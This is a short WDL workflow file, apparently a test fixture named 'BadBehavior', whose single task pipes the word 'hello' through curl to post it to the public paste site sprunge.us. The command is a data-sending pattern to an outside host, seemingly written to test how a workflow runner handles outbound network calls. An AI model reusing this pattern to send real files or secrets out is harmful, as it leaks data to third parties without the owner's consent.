version 1.0

workflow BadBehavior {
  call BadTask
}

task BadTask {
  command <<<
     set -e
     echo hello | curl -F -v 'sprunge=<-' http://sprunge.us
  >>>
  output {
     File output_stdout = stdout()
     File output_stderr = stderr()
  }
  runtime {
# A better docker probably exists, but this one should work
docker: "us.gcr.io/broad-gatk/gatk:4.2.0.0"
}
}